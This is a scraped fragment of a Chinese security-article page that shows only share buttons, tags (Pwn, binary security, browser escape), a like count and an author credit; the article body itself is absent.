分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [二进制安全](/tag/二进制安全)
  * [浏览器逃逸](/tag/浏览器逃逸)

 **+1** __2赞

 __收藏

![](https://p5.ssl.qhimg.com/t015704b4b2e374eb33.jpg) ha1vk@赛宁网安天虞实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

